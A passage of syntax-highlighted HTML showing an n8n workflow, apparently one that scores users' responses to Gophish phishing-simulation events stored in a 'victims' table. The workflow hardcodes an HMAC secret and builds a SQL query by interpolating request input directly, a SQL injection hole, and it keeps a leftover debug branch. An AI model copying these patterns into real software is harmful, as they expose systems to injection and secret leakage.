class="punctuation">}</span></span><br><span class="line">      <span class="punctuation">}</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">"id"</span><span class="punctuation">:</span> <span class="string">"0abc2e19-6ccc-4114-bf27-938b98ad5819"</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">"name"</span><span class="punctuation">:</span> <span class="string">"Check gophish header"</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">"type"</span><span class="punctuation">:</span> <span class="string">"n8n-nodes-base.if"</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">"typeVersion"</span><span class="punctuation">:</span> <span class="number">2</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">"position"</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="number">440</span><span class="punctuation">,</span></span><br><span class="line">        <span class="number">440</span></span><br><span class="line">      <span class="punctuation">]</span></span><br><span class="line">    <span class="punctuation">}</span><span class="punctuation">,</span></span><br><span class="line">    <span class="punctuation">{</span></span><br><span class="line">      <span class="attr">"parameters"</span><span class="punctuation">:</span> <span class="punctuation">{</span></span><br><span class="line">        <span class="attr">"jsCode"</span><span class="punctuation">:</span> <span class="string">"const signatureHeader = $json.headers[\"x-gophish-signature\"];\nconst signature = signatureHeader.split('=')[1];\nreturn { json: { signature: signature, body: $json.body } };"</span></span><br><span class="line">      <span class="punctuation">}</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">"id"</span><span class="punctuation">:</span> <span class="string">"49aff93b-5d21-490d-a2af-95611d8f83d1"</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">"name"</span><span class="punctuation">:</span> <span class="string">"Extract signature"</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">"type"</span><span class="punctuation">:</span> <span class="string">"n8n-nodes-base.code"</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">"typeVersion"</span><span class="punctuation">:</span> <span class="number">2</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">"position"</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="number">660</span><span class="punctuation">,</span></span><br><span class="line">        <span class="number">340</span></span><br><span class="line">      <span class="punctuation">]</span></span><br><span class="line">    <span class="punctuation">}</span><span class="punctuation">,</span></span><br><span class="line">    <span class="punctuation">{</span></span><br><span class="line">      <span class="attr">"parameters"</span><span class="punctuation">:</span> <span class="punctuation">{</span></span><br><span class="line">        <span class="attr">"action"</span><span class="punctuation">:</span> <span class="string">"hmac"</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">"type"</span><span class="punctuation">:</span> <span class="string">"SHA256"</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">"value"</span><span class="punctuation">:</span> <span class="string">"={{ JSON.stringify($json.body) }}"</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">"dataPropertyName"</span><span class="punctuation">:</span> <span class="string">"calculated_signature"</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">"secret"</span><span class="punctuation">:</span> <span class="string">"3CWVGMndgMvdVAzOjqBiTicmv7gxc6IS"</span></span><br><span class="line">      <span class="punctuation">}</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">"id"</span><span class="punctuation">:</span> <span class="string">"e406828a-0d97-44b8-8798-6d066c4a4159"</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">"name"</span><span class="punctuation">:</span> <span class="string">"Calculate the signature"</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">"type"</span><span class="punctuation">:</span> <span class="string">"n8n-nodes-base.crypto"</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">"typeVersion"</span><span class="punctuation">:</span> <span class="number">1</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">"position"</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="number">860</span><span class="punctuation">,</span></span><br><span class="line">        <span class="number">340</span></span><br><span class="line">      <span class="punctuation">]</span></span><br><span class="line">    <span class="punctuation">}</span><span class="punctuation">,</span></span><br><span class="line">    <span class="punctuation">{</span></span><br><span class="line">      <span class="attr">"parameters"</span><span class="punctuation">:</span> <span class="punctuation">{</span></span><br><span class="line">        <span class="attr">"conditions"</span><span class="punctuation">:</span> <span class="punctuation">{</span></span><br><span class="line">          <span class="attr">"options"</span><span class="punctuation">:</span> <span class="punctuation">{</span></span><br><span class="line">            <span class="attr">"caseSensitive"</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">"leftValue"</span><span class="punctuation">:</span> <span class="string">""</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">"typeValidation"</span><span class="punctuation">:</span> <span class="string">"strict"</span></span><br><span class="line">          <span class="punctuation">}</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">"conditions"</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">            <span class="punctuation">{</span></span><br><span class="line">              <span class="attr">"id"</span><span class="punctuation">:</span> <span class="string">"4f69b753-a1ff-4376-88a0-032ede5d9223"</span><span class="punctuation">,</span></span><br><span class="line">              <span class="attr">"leftValue"</span><span class="punctuation">:</span> <span class="string">"={{ $json.keys() }}"</span><span class="punctuation">,</span></span><br><span class="line">              <span class="attr">"rightValue"</span><span class="punctuation">:</span> <span class="string">""</span><span class="punctuation">,</span></span><br><span class="line">              <span class="attr">"operator"</span><span class="punctuation">:</span> <span class="punctuation">{</span></span><br><span class="line">                <span class="attr">"type"</span><span class="punctuation">:</span> <span class="string">"array"</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">"operation"</span><span class="punctuation">:</span> <span class="string">"empty"</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">"singleValue"</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span></span><br><span class="line">              <span class="punctuation">}</span></span><br><span class="line">            <span class="punctuation">}</span><span class="punctuation">,</span></span><br><span class="line">            <span class="punctuation">{</span></span><br><span class="line">              <span class="attr">"id"</span><span class="punctuation">:</span> <span class="string">"9605ee34-f897-48cf-93d9-756503337686"</span><span class="punctuation">,</span></span><br><span class="line">              <span class="attr">"leftValue"</span><span class="punctuation">:</span> <span class="string">""</span><span class="punctuation">,</span></span><br><span class="line">              <span class="attr">"rightValue"</span><span class="punctuation">:</span> <span class="string">""</span><span class="punctuation">,</span></span><br><span class="line">              <span class="attr">"operator"</span><span class="punctuation">:</span> <span class="punctuation">{</span></span><br><span class="line">                <span class="attr">"type"</span><span class="punctuation">:</span> <span class="string">"string"</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">"operation"</span><span class="punctuation">:</span> <span class="string">"equals"</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">"name"</span><span class="punctuation">:</span> <span class="string">"filter.operator.equals"</span></span><br><span class="line">              <span class="punctuation">}</span></span><br><span class="line">            <span class="punctuation">}</span></span><br><span class="line">          <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">"combinator"</span><span class="punctuation">:</span> <span class="string">"and"</span></span><br><span class="line">        <span class="punctuation">}</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">"options"</span><span class="punctuation">:</span> <span class="punctuation">{</span><span class="punctuation">}</span></span><br><span class="line">      <span class="punctuation">}</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">"id"</span><span class="punctuation">:</span> <span class="string">"72f5d0bd-9025-4e7b-8d1f-8746035a2138"</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">"name"</span><span class="punctuation">:</span> <span class="string">"check if user exists in database"</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">"type"</span><span class="punctuation">:</span> <span class="string">"n8n-nodes-base.if"</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">"typeVersion"</span><span class="punctuation">:</span> <span class="number">2</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">"position"</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="number">1620</span><span class="punctuation">,</span></span><br><span class="line">        <span class="number">240</span></span><br><span class="line">      <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">"alwaysOutputData"</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">"executeOnce"</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span></span><br><span class="line">    <span class="punctuation">}</span><span class="punctuation">,</span></span><br><span class="line">    <span class="punctuation">{</span></span><br><span class="line">      <span class="attr">"parameters"</span><span class="punctuation">:</span> <span class="punctuation">{</span></span><br><span class="line">        <span class="attr">"operation"</span><span class="punctuation">:</span> <span class="string">"executeQuery"</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">"query"</span><span class="punctuation">:</span> <span class="string">"SELECT * FROM victims where email = \"{{ $json.body.email }}\" LIMIT 1"</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">"options"</span><span class="punctuation">:</span> <span class="punctuation">{</span><span class="punctuation">}</span></span><br><span class="line">      <span class="punctuation">}</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">"id"</span><span class="punctuation">:</span> <span class="string">"5929bf85-d38b-4fdd-ae76-f0a61e2cef55"</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">"name"</span><span class="punctuation">:</span> <span class="string">"Get current phishing score"</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">"type"</span><span class="punctuation">:</span> <span class="string">"n8n-nodes-base.mySql"</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">"typeVersion"</span><span class="punctuation">:</span> <span class="number">2.4</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">"position"</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="number">1380</span><span class="punctuation">,</span></span><br><span class="line">        <span class="number">260</span></span><br><span class="line">      <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">"alwaysOutputData"</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">"retryOnFail"</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">"executeOnce"</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">"notesInFlow"</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">"credentials"</span><span class="punctuation">:</span> <span class="punctuation">{</span></span><br><span class="line">        <span class="attr">"mySql"</span><span class="punctuation">:</span> <span class="punctuation">{</span></span><br><span class="line">          <span class="attr">"id"</span><span class="punctuation">:</span> <span class="string">"qEqs6Hx9HRmSTg5v"</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">"name"</span><span class="punctuation">:</span> <span class="string">"mariadb - phishing"</span></span><br><span class="line">        <span class="punctuation">}</span></span><br><span class="line">      <span class="punctuation">}</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">"onError"</span><span class="punctuation">:</span> <span class="string">"continueErrorOutput"</span></span><br><span class="line">    <span class="punctuation">}</span><span class="punctuation">,</span></span><br><span class="line">    <span class="punctuation">{</span></span><br><span class="line">      <span class="attr">"parameters"</span><span class="punctuation">:</span> <span class="punctuation">{</span></span><br><span class="line">        <span class="attr">"respondWith"</span><span class="punctuation">:</span> <span class="string">"text"</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">"responseBody"</span><span class="punctuation">:</span> <span class="string">"Info: User is not in database"</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">"options"</span><span class="punctuation">:</span> <span class="punctuation">{</span><span class="punctuation">}</span></span><br><span class="line">      <span class="punctuation">}</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">"id"</span><span class="punctuation">:</span> <span class="string">"e9806005-9ca3-4899-9b62-8d9d56ec413f"</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">"name"</span><span class="punctuation">:</span> <span class="string">"user not in database"</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">"type"</span><span class="punctuation">:</span> <span class="string">"n8n-nodes-base.respondToWebhook"</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">"typeVersion"</span><span class="punctuation">:</span> <span class="number">1.1</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">"position"</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="number">1960</span><span class="punctuation">,</span></span><br><span class="line">        <span class="number">140</span></span><br><span class="line">      <span class="punctuation">]</span></span><br><span class="line">    <span class="punctuation">}</span><span class="punctuation">,</span></span><br><span class="line">    <span class="punctuation">{</span></span><br><span class="line">      <span class="attr">"parameters"</span><span class="punctuation">:</span> <span class="punctuation">{</span></span><br><span class="line">        <span class="attr">"httpMethod"</span><span class="punctuation">:</span> <span class="string">"POST"</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">"path"</span><span class="punctuation">:</span> <span class="string">"d96af3a4-21bd-4bcb-bd34-37bfc67dfd1d"</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">"responseMode"</span><span class="punctuation">:</span> <span class="string">"responseNode"</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">"options"</span><span class="punctuation">:</span> <span class="punctuation">{</span><span class="punctuation">}</span></span><br><span class="line">      <span class="punctuation">}</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">"id"</span><span class="punctuation">:</span> <span class="string">"e425306c-06ba-441b-9860-170433602b1a"</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">"name"</span><span class="punctuation">:</span> <span class="string">"Webhook"</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">"type"</span><span class="punctuation">:</span> <span class="string">"n8n-nodes-base.webhook"</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">"typeVersion"</span><span class="punctuation">:</span> <span class="number">2</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">"position"</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="number">220</span><span class="punctuation">,</span></span><br><span class="line">        <span class="number">440</span></span><br><span class="line">      <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">"webhookId"</span><span class="punctuation">:</span> <span class="string">"d96af3a4-21bd-4bcb-bd34-37bfc67dfd1d"</span></span><br><span class="line">    <span class="punctuation">}</span><span class="punctuation">,</span></span><br><span class="line">    <span class="punctuation">{</span></span><br><span class="line">      <span class="attr">"parameters"</span><span class="punctuation">:</span> <span class="punctuation">{</span></span><br><span class="line">        <span class="attr">"errorMessage"</span><span class="punctuation">:</span> <span class="string">"User not found. This should not happen"</span></span><br><span class="line">      <span class="punctuation">}</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">"id"</span><span class="punctuation">:</span> <span class="string">"ec2fc3c3-014f-49b7-af14-263b2d41250d"</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">"name"</span><span class="punctuation">:</span> <span class="string">"Stop and Error"</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">"type"</span><span class="punctuation">:</span> <span class="string">"n8n-nodes-base.stopAndError"</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">"typeVersion"</span><span class="punctuation">:</span> <span class="number">1</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">"position"</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="number">2180</span><span class="punctuation">,</span></span><br><span class="line">        <span class="number">140</span></span><br><span class="line">      <span class="punctuation">]</span></span><br><span class="line">    <span class="punctuation">}</span><span class="punctuation">,</span></span><br><span class="line">    <span class="punctuation">{</span></span><br><span class="line">      <span class="attr">"parameters"</span><span class="punctuation">:</span> <span class="punctuation">{</span></span><br><span class="line">        <span class="attr">"errorMessage"</span><span class="punctuation">:</span> <span class="string">"User not found. This should not happen"</span></span><br><span class="line">      <span class="punctuation">}</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">"id"</span><span class="punctuation">:</span> <span class="string">"f6d17a91-3305-488e-bb2a-79d10ec00c57"</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">"name"</span><span class="punctuation">:</span> <span class="string">"Stop"</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">"type"</span><span class="punctuation">:</span> <span class="string">"n8n-nodes-base.stopAndError"</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">"typeVersion"</span><span class="punctuation">:</span> <span class="number">1</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">"position"</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="number">1840</span><span class="punctuation">,</span></span><br><span class="line">        <span class="number">20</span></span><br><span class="line">      <span class="punctuation">]</span></span><br><span class="line">    <span class="punctuation">}</span></span><br><span class="line">  <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">"pinData"</span><span class="punctuation">:</span> <span class="punctuation">{</span><span class="punctuation">}</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">"connections"</span><span class="punctuation">:</span> <span class="punctuation">{</span></span><br><span class="line">    <span class="attr">"If Clicked"</span><span class="punctuation">:</span> <span class="punctuation">{</span></span><br><span class="line">      <span class="attr">"main"</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="punctuation">[</span></span><br><span class="line">          <span class="punctuation">{</span></span><br><span class="line">            <span class="attr">"node"</span><span class="punctuation">:</span> <span class="string">"Update Phishing Score for Clicked Event"</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">"type"</span><span class="punctuation">:</span> <span class="string">"main"</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">"index"</span><span class="punctuation">:</span> <span class="number">0</span></span><br><span class="line">          <span class="punctuation">}</span></span><br><span class="line">        <span class="punctuation">]</span></span><br><span class="line">      <span class="punctuation">]</span></span><br><span class="line">    <span class="punctuation">}</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">"If Submitted Data"</span><span class="punctuation">:</span> <span class="punctuation">{</span></span><br><span class="line">      <span class="attr">"main"</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="punctuation">[</span></span><br><span class="line">          <span class="punctuation">{</span></span><br><span class="line">            <span class="attr">"node"</span><span class="punctuation">:</span> <span class="string">"Update Phishing Score for Submitted Data"</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">"type"</span><span class="punctuation">:</span> <span class="string">"main"</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">"index"</span><span class="punctuation">:</span> <span class="number">0</span></span><br><span class="line">          <span class="punctuation">}</span></span><br><span class="line">        <span class="punctuation">]</span></span><br><span class="line">      <span class="punctuation">]</span></span><br><span class="line">    <span class="punctuation">}</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">"Update Phishing Score for Clicked Event"</span><span class="punctuation">:</span> <span class="punctuation">{</span></span><br><span class="line">      <span class="attr">"main"</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="punctuation">[</span></span><br><span class="line">          <span class="punctuation">{</span></span><br><span class="line">            <span class="attr">"node"</span><span class="punctuation">:</span> <span class="string">"Success"</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">"type"</span><span class="punctuation">:</span> <span class="string">"main"</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">"index"</span><span class="punctuation">:</span> <span class="number">0</span></span><br><span class="line">          <span class="punctuation">}</span></span><br><span class="line">        <span class="punctuation">]</span></span><br><span class="line">      <span class="punctuation">]</span></span><br><span class="line">    <span class="punctuation">}</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">"Update Phishing Score for Submitted Data"</span><span class="punctuation">:</span> <span class="punctuation">{</span></span><br><span class="line">      <span class="attr">"main"</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="punctuation">[</span></span><br><span class="line">          <span class="punctuation">{</span></span><br><span class="line">            <span class="attr">"node"</span><span class="punctuation">:</span> <span class="string">"Success"</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">"type"</span><span class="punctuation">:</span> <span class="string">"main"</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">"index"</span><span class="punctuation">:</span> <span class="number">0</span></span><br><span class="line">          <span class="punctuation">}</span></span><br><span class="line">        <span class="punctuation">]</span></span><br><span class="line">      <span class="punctuation">]</span></span><br><span class="line">    <span class="punctuation">}</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">"Compare signature"</span><span class="punctuation">:</span> <span class="punctuation">{</span></span><br><span class="line">      <span class="attr">"main"</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="punctuation">[</span></span><br><span class="line">          <span class="punctuation">{</span></span><br><span class="line">            <span class="attr">"node"</span><span class="punctuation">:</span> <span class="string">"Get current phishing score"</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">"type"</span><span class="punctuation">:</span> <span class="string">"main"</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">"index"</span><span class="punctuation">:</span> <span class="number">0</span></span><br><span class="line">          <span class="punctuation">}</span></span><br><span class="line">        <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">        <span class="punctuation">[</span></span><br><span class="line">          <span class="punctuation">{</span></span><br><span class="line">            <span class="attr">"node"</span><span class="punctuation">:</span> <span class="string">"invalid signature"</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">"type"</span><span class="punctuation">:</span> <span class="string">"main"</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">"index"</span><span class="punctuation">:</span> <span class="number">0</span></span><br><span class="line">          <span class="punctuation">}</span></span><br><span class="line">        <span class="punctuation">]</span></span><br><span class="line">      <span class="punctuation">]</span></span><br><span class="line">    <span class="punctuation">}</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">"Check gophish header"</span><span class="punctuation">:</span> <span class="punctuation">{</span></span><br><span class="line">      <span class="attr">"main"</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="punctuation">[</span></span><br><span class="line">          <span class="punctuation">{</span></span><br><span class="line">            <span class="attr">"node"</span><span class="punctuation">:</span> <span class="string">"Extract signature"</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">"type"</span><span class="punctuation">:</span> <span class="string">"main"</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">"index"</span><span class="punctuation">:</span> <span class="number">0</span></span><br><span class="line">          <span class="punctuation">}</span></span><br><span class="line">        <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">        <span class="punctuation">[</span></span><br><span class="line">          <span class="punctuation">{</span></span><br><span class="line">            <span class="attr">"node"</span><span class="punctuation">:</span> <span class="string">"no signature"</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">"type"</span><span class="punctuation">:</span> <span class="string">"main"</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">"index"</span><span class="punctuation">:</span> <span class="number">0</span></span><br><span class="line">          <span class="punctuation">}</span></span><br><span class="line">        <span class="punctuation">]</span></span><br><span class="line">      <span class="punctuation">]</span></span><br><span class="line">    <span class="punctuation">}</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">"Extract signature"</span><span class="punctuation">:</span> <span class="punctuation">{</span></span><br><span class="line">      <span class="attr">"main"</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="punctuation">[</span></span><br><span class="line">          <span class="punctuation">{</span></span><br><span class="line">            <span class="attr">"node"</span><span class="punctuation">:</span> <span class="string">"Calculate the signature"</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">"type"</span><span class="punctuation">:</span> <span class="string">"main"</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">"index"</span><span class="punctuation">:</span> <span class="number">0</span></span><br><span class="line">          <span class="punctuation">}</span></span><br><span class="line">        <span class="punctuation">]</span></span><br><span class="line">      <span class="punctuation">]</span></span><br><span class="line">    <span class="punctuation">}</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">"Calculate the signature"</span><span class="punctuation">:</span> <span class="punctuation">{</span></span><br><span class="line">      <span class="attr">"main"</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="punctuation">[</span></span><br><span class="line">          <span class="punctuation">{</span></span><br><span class="line">            <span class="attr">"node"</span><span class="punctuation">:</span> <span class="string">"Compare signature"</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">"type"</span><span class="punctuation">:</span> <span class="string">"main"</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">"index"</span><span class="punctuation">:</span> <span class="number">0</span></span><br><span class="line">          <span class="punctuation">}</span></span><br><span class="line">        <span class="punctuation">]</span></span><br><span class="line">      <span class="punctuation">]</span></span><br><span class="line">    <span class="punctuation">}</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">"check if user exists in database"</span><span class="punctuation">:</span> <span class="punctuation">{</span></span><br><span class="line">      <span class="attr">"main"</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="punctuation">[</span></span><br><span class="line">          <span class="punctuation">{</span></span><br><span class="line">            <span class="attr">"node"</span><span class="punctuation">:</span> <span class="string">"user not in database"</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">"type"</span><span class="punctuation">:</span> <span class="string">"main"</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">"index"</span><span class="punctuation">:</span> <span class="number">0</span></span><br><span class="line">          <span class="punctuation">}</span></span><br><span class="line">        <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">        <span class="punctuation">[</span></span><br><span class="line">          <span class="punctuation">{</span></span><br><span class="line">            <span class="attr">"node"</span><span class="punctuation">:</span> <span class="string">"If Clicked"</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">"type"</span><span class="punctuation">:</span> <span class="string">"main"</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">"index"</span><span class="punctuation">:</span> <span class="number">0</span></span><br><span class="line">          <span class="punctuation">}</span><span class="punctuation">,</span></span><br><span class="line">          <span class="punctuation">{</span></span><br><span class="line">            <span class="attr">"node"</span><span class="punctuation">:</span> <span class="string">"If Submitted Data"</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">"type"</span><span class="punctuation">:</span> <span class="string">"main"</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">"index"</span><span class="punctuation">:</span> <span class="number">0</span></span><br><span class="line">          <span class="punctuation">}</span></span><br><span class="line">        <span class="punctuation">]</span></span><br><span class="line">      <span class="punctuation">]</span></span><br><span class="line">    <span class="punctuation">}</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">"Get current phishing score"</span><span class="punctuation">:</span> <span class="punctuation">{</span></span><br><span class="line">      <span class="attr">"main"</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="punctuation">[</span></span><br><span class="line">          <span class="punctuation">{</span></span><br><span class="line">            <span class="attr">"node"</span><span class="punctuation">:</span> <span class="string">"check if user exists in database"</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">"type"</span><span class="punctuation">:</span> <span class="string">"main"</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">"index"</span><span class="punctuation">:</span> <span class="number">0</span></span><br><span class="line">          <span class="punctuation">}</span></span><br><span class="line">        <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">        <span class="punctuation">[</span></span><br><span class="line">          <span class="punctuation">{</span></span><br><span class="line">            <span class="attr">"node"</span><span class="punctuation">:</span> <span class="string">"DEBUG: REMOVE SOON"</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">"type"</span><span class="punctuation">:</span> <span class="string">"main"</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">"index"</span><span class="punctuation">:</span> <span class="number">0</span></span><br><span class="line">          <span class="punctuation">}</span></span><br><span class="line">        <span class="punctuation">]</span></span><br><span class="line">      <span class="punctuation">]</span></span><br><span class="line">    <span class="punctuation">}</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">"Webhook"</span><span class="punctuation">:</span> <span class="punctuation">{</span></span><br><span class="line">      <span class="attr">"main"</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="punctuation">[</span></span><br><span class="line">          <span class="punctuation">{</span></span><br><span class="line">            <span class="attr">"node"</span><span class="punctuation">:</span> <span class="string">"Check gophish header"</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">"type"</span><span class="punctuation">:</span> <span class="string">"main"</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">"index"</span><span class="punctuation">:</span> <span class="number">0</span></span><br><span class="line">          <span class="punctuation">}</span></span><br><span class="line">        <span class="punctuation">]</span></span><br><span class="line">      <span class="punctuation">]</span></span><br><span class="line">    <span class="punctuation">}</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">"user not in database"</span><span class="punctuation">:</span> <span class="punctuation">{</span></span><br><span class="line">      <span class="attr">"main"</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="punctuation">[</span></span><br><span class="line">          <span class="punctuation">{</span></span><br><span class="line">            <span class="attr">"node"</span><span class="punctuation">:</span> <span class="string">"Stop and Error"</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">"type"</span><span class="punctuation">:</span> <span class="string">"main"</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">"index"</span><span class="punctuation">:</span> <span class="number">0</span></span><br><span class="line">          <span 